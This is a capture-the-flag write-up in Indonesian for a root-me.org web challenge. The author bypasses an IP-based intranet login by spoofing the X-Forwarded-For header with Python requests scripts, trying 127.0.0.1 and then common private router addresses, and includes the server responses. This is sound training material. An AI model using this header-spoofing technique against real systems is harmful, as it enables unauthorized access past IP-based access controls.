---
Title: root-me.org writeup - IP restriction bypass
Author: 0xHynz
Date: 2022-04-01
Tags:
- HTTP
- ctf
- writeup
- webserver
categories:
- write ups

description: "dalam challenge ini kita disuruh untuk membypass pembatasan ip yang ada untuk mencoba login tanpa menggunakan username maupun password karena bisa diakses apabila memggunakan...."

---


IP Restriction bypass

dalam challenge ini kita disuruh untuk membypass pembatasan ip yang ada untuk mencoba login tanpa menggunakan username maupun password karena bisa diakses apabila memggunakan jaringan internal, kurang lebih seperti itu.


#### **CLUE**
Dear colleagues,

We’re now managing connections to the intranet using private IP addresses, so it’s no longer necessary to login with a username / password when you are already connected to the internal company network.

Regards,

The network admin



# Step in progress
kita diberikan sebuah link http://challenge01.root-me.org/web-serveur/ch68/ untuk mengakses halaman challengenya, ketika dibuka seperti inilah tampilannya

<img src="https://i.ibb.co/zswzc17/IMG-20220401-081001.jpg" alt="IMG-20220401-081001" class="img-fluid">

<br><br>
disini terdapat informasi kalau ip address kita adalah 202.73.26.231 dan ini bukanlah jaringan internal dari web nya.

disini saya terpikir melakukan HTTP request terhadap websitenya dengan menambahkan header X-Forwarded-For, karena ini adalah salah satu header untuk mengidentifikasi IP Klien, selain itu kita juga bisa memodifikasinya nantinya untuk merubah IP kita.



disini saya melakukan HTTP request melalui python dengan bantuan requests. nah disini yang terbesit diotak saya adalah merubah IP saya me jadi 127.0.0.1.

```
import requests

header = {"X-Forwarded-For":"127.0.0.1"}
url = "http://challenge01.root-me.org/web-serveur/ch68/"
r = requests.get(url,headers=header)
print (r.text)
```

terlihat outputnya seperti ini

```
<!DOCTYPE html>
<html>
<head>
        <title>Secured Intranet</title>
</head>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
                        <span>Your IP <strong>127.0.0.1</strong> do not belong to the LAN.</span>
                <h1>Intranet</h1>
                <form method="post">
                        <p>
                                <label for="login">Login:</label>
                                <input type="text" name="login">
                        </p>
                        <p>
                                <label for="pass">Password:</label>
                                <input type="text" name="mdp">
                        </p>
                        <p>
                                <input type="submit" value="login">
                        </p>
                        <p>
                                <small>You should authenticate because you're not on the LAN.</small>
                        </p>
                </form>
        </body>
</html>
```

namun 127.0.0.1 bukan alamat IP yang tepat, saya disini melakukan banyak percobaan mulai dari memeriksa alamat ip dari subdomain challenge01.root-me.org, melakukan subneting terhadap beberapa alamat, dsb. namun tetap saja nihil.


tapi ketika saya mencoba dengan beberapa alamat ip default yang sering digunakan oleh router, ternyata bisa.

```
import requests


address = ["192.168.0.1","192.168.1.1","192.168.1.2"]

print(len(requests.get("http://challenge01.root-me.org/web-serveur/ch68/").text))

for ip in address:
   headers = {"X-Forwarded-For":ip}
   r = \
   requests.get(
           "http://challenge01.root-me.org/web-serveur/ch68/",
           headers=headers)
   print(len(r.text))


```

saya melakukan for loop dengan 3 alamat ip dan menambahkanya kedalam header x-forwarded-for, untuk dibagian beberapa fungsi len() saya mencoba untuk memeriksa perubahan dalam websitenya.

output:

```
746
391
391
391
```

disini kita mendaptkan perubahan yang sama untuk 3 alamat ip yang kita coba, kita bisa melihat bagaimana hasilnya. untuk melihatnya kalian bisa hapus `print(len(r.text))` menjadi `print(r.text)` yang ada di kode atas. 


```
<!DOCTYPE html>
<html>
<head>
        <title>Secured Intranet</title>
</head>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
                        <h1>Intranet</h1>
                <div>
                        Well done, the validation password is: <strong>XXXXXXXXXCODE
</strong>
                </div>
        </body>
</html>
```


nah sekarang kita mendapatkan validation passwordnya, mungkin beginilah cara saya menyelesaikan tantangan dari root-me.org ini, walau sebenarnya sederhana tapi bagi saya kesusahan juga untuk menyelesaikannya, karena saya memang buku sesepuh.
